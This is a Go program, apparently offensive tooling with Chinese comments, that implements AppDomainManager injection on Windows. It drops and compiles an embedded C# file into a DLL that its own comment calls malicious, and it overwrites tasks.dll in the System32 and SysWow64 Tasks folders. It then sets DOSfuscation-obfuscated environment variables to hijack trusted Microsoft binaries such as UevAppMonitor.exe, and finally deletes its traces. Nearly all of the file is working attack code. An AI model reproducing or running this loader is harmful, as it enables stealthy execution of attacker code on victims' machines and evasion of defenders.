package main

import (
	"log"
	"os/exec"

	"./bindata"
)

func main() {
	bindata.RestoreAssets(`C:\Users\Public\`, "tasks.cs")
	// 将tasks.cs嵌入golang中

	cmd_csc := exec.Command("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe", "/target:library", "/out:C:\\Users\\Public\\tasks.dll", "C:\\Users\\Public\\tasks.cs")
	err := cmd_csc.Run()
	if err != nil {
		log.Fatalf("cmd_csc failed with %s\n", err)
	}
	//将c#源文件 生成 DLL   到C:\Users\Public  目录下
	cmd_del1 := exec.Command("cmd", "/c", "del", "C:\\Windows\\System32\\Tasks\\tasks.dll", "&&", "del", "C:\\Windows\\SysWow64\\Tasks\\tasks.dll")
	err_del1 := cmd_del1.Run()
	if err_del1 != nil {
		log.Fatalf("cmd_del failed with %s\n", err_del1)
	}
	//删除 x86 和x64 Tasks下的 Tasks.dll

	cmd_copy := exec.Command("cmd", "/c", "copy", "/Y", "C:\\Users\\Public\\tasks.dll", "C:\\Windows\\System32\\Tasks\\tasks.dll", "&&", "copy", "/Y", "C:\\Users\\Public\\tasks.dll", "C:\\Windows\\SysWow64\\Tasks\\tasks.dll")
	err_copy := cmd_copy.Run()
	if err_copy != nil {
		log.Fatalf("cmd_copy  failed with %s\n", err_copy)
	}
	//复制恶意DLL 到 x86 和x64 Tasks下的 Tasks.dll
	cmd_set := exec.Command("cmd", "/c", `set%CommonProgramW6432:~23,1%%TEMP:~-18,1%PPDOMAIN_MA%OS:~8,-1%AGER_ASM=ta%HOMEPATH:~2,1%ks,%ProgramFiles:~10,-5%Version=0.0.0.0,%ProgramFiles:~-6,1%%CommonProgramW6432:~17,-11%%PUBLIC:~10,1%ltu%LOCALAPPDATA:~6,1%%CommonProgramFiles(x86):~-2,-1%=n%ProgramFiles:~14,-1%utral, P%PUBLIC:~-5,-4%%PUBLIC:~-4,-3%licK%ProgramFiles:~14,1%yTok%CommonProgramFiles:~27,-1%n=n%PUBLIC:~10,1%%ProgramFiles:~13,1%%CommonProgramW6432:~26,1%&&set %CommonProgramW6432:~17,-11%OMP%LOCALAPPDATA:~-5,-4%US_V%CommonProgramW6432:~-15,-14%r%CommonProgramFiles:~-14,1%i%LOCALAPPDATA:~-4,1%%APPDATA:~-2,-1%=v4.0.30319&&set AP%ProgramFiles(x86):~-19,-18%DOMAIN%OS:~-3,-2%M%TEMP:~-18,-17%N%TEMP:~-18,1%%PROMPT:~3,1%E%APPDATA:~-7,-6%%OS:~-3,1%TYPE=My%LOCALAPPDATA:~-13,1%pp%ProgramData:~10,-3%omai%APPDATA:~-2,-1%Man%TMP:~-14,-13%g%TEMP:~-3,1%r&&Uev%TMP:~-18,1%%TEMP:~-1,1%pM%windir:~-3,-2%%windir:~-5,-4%%APPDATA:~-3,-2%%ALLUSERSPROFILE:~-2,-1%%ProgramFiles(x86):~-17,1%r.ex%TEMP:~-3,1%`)
	err_set := cmd_set.Run()
	if err_set != nil {
		log.Fatalf("cmd_set failed with %s\n", err_set)
	}
	// set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
	// set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
	// set COMPLUS_Version=v4.0.30319
	//设置环境变量 进行以下程序调用
	// FileHistory.exe /?

	// Microsoft.Uev.SyncController.exe

	// PresentationHost.exe

	// stordiag.exe

	// TsWpfWrp.exe

	// UevAgentPolicyGenerator.exe

	// UevAppMonitor.exe

	// UevTemplateBaselineGenerator.exe

	// UevTemplateConfigItemGenerator.exe
	//https://github.com/danielbohannon/Invoke-DOSfuscation  混淆
	//https://twitter.com/subTee/status/1216465628946563073
	//https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26

	cmd_del2 := exec.Command("cmd", "/c", "del", "C:\\Users\\Public\\tasks.dll", "&&", "del", "C:\\Users\\Public\\tasks.cs")
	err_del2 := cmd_del2.Run()
	if err_del2 != nil {
		log.Fatalf("cmd_del failed with %s\n", err_del2)
	}
	//删除缓存清理文件
}
